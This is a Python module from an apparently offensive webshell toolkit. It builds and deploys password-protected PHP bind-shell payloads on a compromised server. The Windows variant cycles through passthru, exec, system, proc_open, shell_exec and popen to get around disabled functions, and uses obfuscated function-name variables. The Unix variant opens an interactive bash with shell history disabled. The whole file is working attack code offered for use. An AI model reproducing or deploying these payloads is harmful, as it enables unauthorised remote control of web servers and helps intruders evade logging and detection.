from libs.config import alias, color
from libs.myapp import send, is_windows
from threading import Thread
from time import sleep


def get_php(port, passwd):
    if (is_windows()):
        return """$pass="%s";
$port=%s;
@error_reporting(0);
@set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
$sQUf=@ini_get('disable_functions');
if(!empty($sQUf)){
  $sQUf=preg_replace('/[, ]+/', ',', $sQUf);
  $sQUf=explode(',', $sQUf);
  $sQUf=array_map('trim', $sQUf);
}else{
  $sQUf=array();
}
$scl='socket_create_listen';
if(is_callable($scl)&&!in_array($scl,$sQUf)){
  $sock=@$scl($port);
}else{
  $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
  $ret=@socket_bind($sock,0,$port);
  $ret=@socket_listen($sock,5);
}
while (1){
$msgsock=@socket_accept($sock);
$o="password:>";
@socket_write($msgsock,$o,strlen($o));
$pwd=@socket_read($msgsock,2048,PHP_NORMAL_READ);
if (trim($pwd) === $pass){
$o="password correct\\n";
@socket_write($msgsock,$o,strlen($o));
while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
  {
    $o = '';
    $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
    if(FALSE===$c){break;}
    $c=trim($c);
    if(substr($c,0,3) == 'cd '){
      chdir(substr($c,3));
    } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
      break;
    }else{
    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
      $c=$c." 2>&1\\n";
    }
    $NeYd='is_callable';
    $BDpSjt='in_array';
    if($NeYd('passthru')and!$BDpSjt('passthru',$sQUf)){
      ob_start();
      passthru($c);
      $o=ob_get_contents();
      ob_end_clean();
    }else
    if($NeYd('exec')and!$BDpSjt('exec',$sQUf)){
      $o=array();
      exec($c,$o);
      $o=join(chr(10),$o).chr(10);
    }else
    if($NeYd('system')and!$BDpSjt('system',$sQUf)){
      ob_start();
      system($c);
      $o=ob_get_contents();
      ob_end_clean();
    }else
    if($NeYd('proc_open')and!$BDpSjt('proc_open',$sQUf)){
      $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
      $o=NULL;
      while(!feof($pipes[1])){
        $o.=fread($pipes[1],1024);
      }
      @proc_close($handle);
    }else
    if($NeYd('shell_exec')and!$BDpSjt('shell_exec',$sQUf)){
      $o=shell_exec($c);
    }else
    if($NeYd('popen')and!$BDpSjt('popen',$sQUf)){
      $fp=popen($c,'r');
      $o=NULL;
      if(is_resource($fp)){
        while(!feof($fp)){
          $o.=fread($fp,1024);
        }
      }
      @pclose($fp);
    }else
    { $o=0;}
    }
    @socket_write($msgsock,$o,strlen($o));
  }
}else {
  $o="password error";
  @socket_write($msgsock,$o,strlen($o));
}
@socket_close($msgsock);
}""" % (passwd, port)
    else:
        return """$pass="%s";
$port="%s";
$socket = stream_socket_server('tcp://0.0.0.0:'.$port, $errno, $errstr, STREAM_SERVER_BIND|STREAM_SERVER_LISTEN);
if ($socket === false) {
    echo "Bind error";
    die(1);
}
$processes = array();
while (1) {
    $current = @stream_socket_accept($socket, 5, $host);
    if ($current !== false) {
        stream_socket_sendto($current, "password:>");
        $pwd = trim(stream_get_contents($current, strlen($pass)+1));
        if ($pwd === $pass){
            $io = array(
                0 => $current,
                1 => $current,
                2 => $current
                );
            stream_socket_sendto($current, "password correct\\n");
            $proc = proc_open('unset HISTFILE;date;uname -a;bash -i', $io, $pipes);
            $processes[] = array($current, $proc);
        }
        else{
            stream_socket_sendto($current, "password error");
            fflush($current);
            fclose($current);
        }
    }
    foreach ($processes as $k=>$v) {
        $status = proc_get_status($v[1]);
        if (false === $status['running']) {
            fflush($v[0]);
            fclose($v[0]);
            proc_close($v[1]);
            unset($processes[$k]);
        }
    }
}""" % (passwd, port)


@alias(True, func_alias="bs", _type="SHELL")
def run(port: int = 7777, passwd: str = "doughnuts"):
    """
    bind shell

    Bind a port and wait for someone to connect to get a shell.

    eg: bindshell {port=7777} {passwd=doughnuts}
    """
    t = Thread(target=send, args=(get_php(str(port), passwd), ))
    t.setDaemon(True)
    t.start()
    sleep(1)
    if (t.isAlive()):
        print(f"\nBind {port} {color.green('success')}. Password is {color.green(passwd)}\n")
    else:
        print(f"\nBind {port} {color.red('error')}\n")
